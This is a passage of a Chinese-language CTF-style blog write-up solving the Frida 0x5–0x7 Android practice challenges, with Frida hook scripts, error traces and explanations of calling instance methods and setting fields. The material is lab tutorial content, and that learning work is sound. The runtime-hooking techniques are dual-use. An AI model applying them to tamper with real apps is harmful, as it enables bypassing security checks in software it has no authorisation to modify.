class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">var</span> activityClass = <span class="string">&quot;com.ad2001.frida0x5.MainActivity&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> hookInstalled = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试 Hook Activity 的 onResume</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Activity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.Activity&quot;</span>);</span><br><span class="line"><span class="title class_">Activity</span>.<span class="property">onResume</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Activity.onResume() called. Target class should be loaded.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只执行一次 Java.choose</span></span><br><span class="line"><span class="keyword">if</span> (!hookInstalled) &#123;</span><br><span class="line">hookInstalled = <span class="literal">true</span>; <span class="comment">// 防止重复执行 choose</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">choose</span>(activityClass, &#123;</span><br><span class="line"><span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Found instance: &quot;</span> + instance + <span class="string">&quot; via onResume hook.&quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">scheduleOnMainThread</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Calling instance.flag(1337) on main thread...&quot;</span>);</span><br><span class="line">instance.<span class="title function_">flag</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// return &#x27;stop&#x27;; // 如果只需要一个实例</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Java.choose search complete (triggered from onResume).&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用原始的 onResume 方法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">onResume</span>();</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Hook installed on Activity.onResume. Waiting for activity to resume...&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;[-] Failed to hook Activity.onResume: &quot;</span> + e);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;[-] Falling back to simple setTimeout...&quot;</span>);</span><br><span class="line"><span class="comment">// 如果 Hook 失败 (例如权限问题)，回退到 setTimeout</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="comment">/* ... setTimeout code from above ... */</span> &#125;, <span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="看起来可以模仿0x2"><a href="#看起来可以模仿0x2" class="headerlink" title="看起来可以模仿0x2"></a>看起来可以模仿0x2</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x5.MainActivity&quot;</span>);</span><br><span class="line">    a.<span class="title function_">flag</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>但是出现了报错，报错如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0x5 ]-&gt; Error: flag: cannot call instance method without an instance</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1139)</span><br><span class="line">    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)</span><br><span class="line">    at &lt;anonymous&gt; (D:\anquan_question\frida\test.js:3)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)</span><br><span class="line">    at perform (frida/node_modules/frida-java-bridge/index.js:204)</span><br><span class="line">    at &lt;eval&gt; (D:\anquan_question\frida\test.js:4)</span><br><span class="line">Error: flag: cannot call instance method without an instance</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1139)</span><br><span class="line">    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)</span><br><span class="line">    at &lt;anonymous&gt; (D:\anquan_question\frida\test.js:3)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)</span><br><span class="line">    at perform (frida/node_modules/frida-java-bridge/index.js:204)</span><br><span class="line">    at &lt;eval&gt; (D:\anquan_question\frida\test.js:4)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0x5和0x2的区别在于一个是<code>public void flag(int code)</code>而另一个是静态方法<code>public static void get_flag(int a)</code>  （差了一个<code>static</code>）<br>如果把0x5当成静态方法来处理那么就会出现很多的报错</p><h3 id="看起来可以模仿0x4"><a href="#看起来可以模仿0x4" class="headerlink" title="看起来可以模仿0x4"></a>看起来可以模仿0x4</h3><p>那么现在就需要调用实例化方法<br>在0x4我们为了调用get_flag实例化了Check类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x4;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Check</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get_flag</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">1337</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decoded);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么现在为了调用flag我们要调用MainActivity类吗</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x5;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">1337</span>) &#123;            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码是调用MainActivity的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x5.MainActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> main = <span class="title class_">MainActivity</span>.$new();</span><br><span class="line">main.<span class="title function_">flag</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>它出现的报错是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0x5 ]-&gt; Error: flag: cannot call instance method without an instance</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1139)</span><br><span class="line">    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)</span><br><span class="line">    at &lt;anonymous&gt; (D:\anquan_question\frida\test.js:3)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)</span><br><span class="line">    at perform (frida/node_modules/frida-java-bridge/index.js:204)</span><br><span class="line">    at &lt;eval&gt; (D:\anquan_question\frida\test.js:4)</span><br><span class="line">Error: flag: cannot call instance method without an instance</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1139)</span><br><span class="line">    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)</span><br><span class="line">    at &lt;anonymous&gt; (D:\anquan_question\frida\test.js:3)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)</span><br><span class="line">    at perform (frida/node_modules/frida-java-bridge/index.js:204)</span><br><span class="line">    at &lt;eval&gt; (D:\anquan_question\frida\test.js:4)</span><br><span class="line">Error: java.lang.RuntimeException: Can&#x27;t create handler inside thread Thread[Thread-6,10,main] that has not called Looper.prepare()</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:124)</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1237)</span><br><span class="line">    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:643)</span><br><span class="line">    at apply (native)</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1141)</span><br><span class="line">    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)</span><br><span class="line">    at &lt;anonymous&gt; (D:\anquan_question\frida\test.js:4)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)</span><br><span class="line">    at perform (frida/node_modules/frida-java-bridge/index.js:204)</span><br><span class="line">    at &lt;eval&gt; (D:\anquan_question\frida\test.js:7)</span><br><span class="line">Error: java.lang.RuntimeException: Can&#x27;t create handler inside thread Thread[Thread-7,10,main] that has not called Looper.prepare()</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/env.js:124)</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1237)</span><br><span class="line">    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:643)</span><br><span class="line">    at apply (native)</span><br><span class="line">    at value (frida/node_modules/frida-java-bridge/lib/class-factory.js:1141)</span><br><span class="line">    at e (frida/node_modules/frida-java-bridge/lib/class-factory.js:610)</span><br><span class="line">    at &lt;anonymous&gt; (D:\anquan_question\frida\test.js:4)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)</span><br><span class="line">    at perform (frida/node_modules/frida-java-bridge/index.js:204)</span><br><span class="line">    at &lt;eval&gt; (D:\anquan_question\frida\test.js:7)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为什么不能<strong>实例化MainActivity</strong>?<br>由于 Android 的生命周期和线程规则，直接使用 Frida 创建 <code>MainActivity</code> 或任何 Android 组件的实例可能很棘手。Android 组件（如 <code>Activity</code> 子类）依赖于应用程序上下文才能正常运行。在 Frida 中，您可能缺少必要的上下文。Android UI 组件通常需要具有关联 <code>Looper</code> 的特定线程。如果您正在处理 UI 任务，请确保您位于具有活动 <code>Looper</code> 的主线程上。Activity 是更大的 Android 应用程序生命周期的一部分。创建 <code>MainActivity</code> 的实例可能需要应用程序处于特定状态，并且通过 Frida 管理整个生命周期可能并不简单。总之，为 <code>MainActivity</code> 创建实例不是一个好主意。<br>这里的解决方法是：<br>当 Android 应用程序启动时，系统会创建 <code>MainActivity</code> 的实例（或在 AndroidManifest.xml 文件中指定的启动器 Activity）。MainActivity 实例的创建是 Android 应用程序生命周期的一部分。因此，我们只需使用 frida 来获取 <code>MainActivity</code> 的实例，然后调用 <code>flag（）</code> 方法来获取我们的标志。</p><p>在这里介绍一个新的模板<br>在现有实例上调用方法<br><code>Java.performNow</code> ：用于在 Java 运行时的上下文中执行代码的函数。<br><code>Java.choose</code>：在运行时枚举指定 Java 类（作为第一个参数提供）的实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">performNow</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;&lt;Package&gt;.&lt;class_Name&gt;&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>) &#123;</span><br><span class="line">      <span class="comment">// TODO</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>onMatch</code>:<code>onMatch</code> 回调函数针对在 <code>Java.choose</code>作期间找到的指定类的每个实例执行。该回调函数接收当前实例作为其参数。可以在 <code>onMatch</code> 回调中定义要对每个实例执行的自定义操作。<br><code>onComplete</code> 回调在 <code>Java.choose</code>作完成后执行作或清理任务。此块是可选的，如果您在搜索完成后不需要执行任何特定作，则可以选择将其留空。</p><p>实际操作如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">performNow</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x5.MainActivity&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>) &#123; <span class="comment">// &quot;instance&quot; is the instance for the MainActivity</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Instance found&quot;</span>);</span><br><span class="line">        instance.<span class="title function_">flag</span>(<span class="number">1337</span>); <span class="comment">// Calling the function</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="0x6-实例字段"><a href="#0x6-实例字段" class="headerlink" title="0x6 实例字段"></a>0x6 实例字段</h2><p>主要逻辑如下<br>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x6;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get_flag</span><span class="params">(Checker A)</span> <span class="keyword">throws</span> NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1234</span> == A.num1 &amp;&amp; <span class="number">4321</span> == A.num2) &#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Checker</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x6;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Checker</span> &#123;</span><br><span class="line">    <span class="type">int</span> num1;</span><br><span class="line">    <span class="type">int</span> num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次get_flag获取的参数是Checker类，而现在要修改的是类中定义的数<br>所以现在要做的是，实例化，修改值，调用get_flag()</p><h3 id="看起来可以模仿0x3"><a href="#看起来可以模仿0x3" class="headerlink" title="看起来可以模仿0x3"></a>看起来可以模仿0x3</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> check = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);  <span class="comment">// class reference</span></span><br><span class="line">    check.<span class="property">num1</span>.<span class="property">value</span> = <span class="number">1234</span>;</span><br><span class="line">    check.<span class="property">num2</span>.<span class="property">value</span> = <span class="number">4321</span>;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Error: Cannot access an instance field without an instance</span><br><span class="line">    at set (frida/node_modules/frida-java-bridge/lib/class-factory.js:1321)</span><br><span class="line">    at &lt;anonymous&gt; (D:\anquan_question\frida\test.js:3)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)</span><br><span class="line">    at perform (frida/node_modules/frida-java-bridge/index.js:204)</span><br><span class="line">    at &lt;eval&gt; (D:\anquan_question\frida\test.js:7)</span><br></pre></td></tr></table></figure><p>依旧是实例和静态的问题<br>0x3是<code>static int code = 0;</code><br>0x6是<code>int num1;</code><br>不能在一个<strong>类</strong>上直接访问或修改属于<strong>实例</strong>的字段。需要先创建一个 Checker 类的<strong>对象（实例）</strong>，然后才能访问或修改那个<strong>特定对象</strong>的 num1 和 num2 字段。</p><p>实例化，修改值，调用get_flag()<br>现在需要实例化一个类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Checker</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> check = <span class="title class_">Checker</span>.$new();</span><br></pre></td></tr></table></figure><p>然后修改它的值(参照0x3)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.<span class="property">num1</span>.<span class="property">value</span> = <span class="number">1234</span>;</span><br><span class="line">check.<span class="property">num2</span>.<span class="property">value</span> = <span class="number">4321</span>;</span><br></pre></td></tr></table></figure><p>为了实例化调用get_flag,参照0x5使用框架</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">performNow</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;&lt;Package&gt;.&lt;class_Name&gt;&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>) &#123;</span><br><span class="line">      <span class="comment">// TODO</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>实际操作如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">performNow</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x6.MainActivity&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Checker</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> check = <span class="title class_">Checker</span>.$new();</span><br><span class="line">            check.<span class="property">num1</span>.<span class="property">value</span> = <span class="number">1234</span>;</span><br><span class="line">            check.<span class="property">num2</span>.<span class="property">value</span> = <span class="number">4321</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get_flag called&quot;</span>);</span><br><span class="line">            instance.<span class="title function_">get_flag</span>(check);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123; &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>Java.perform vs Java.performNow 的影响:</strong> 对于这个特定的场景，Java.choose 本身就是一个需要等待匹配的操作，其 onMatch 回调是异步触发的。无论外层是 perform 还是 performNow，Java.choose 都能被正确地启动。</p><h2 id="0x7-构造函数-Constructor"><a href="#0x7-构造函数-Constructor" class="headerlink" title="0x7 构造函数(Constructor)"></a>0x7 构造函数(Constructor)</h2><p>主要逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x7;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> 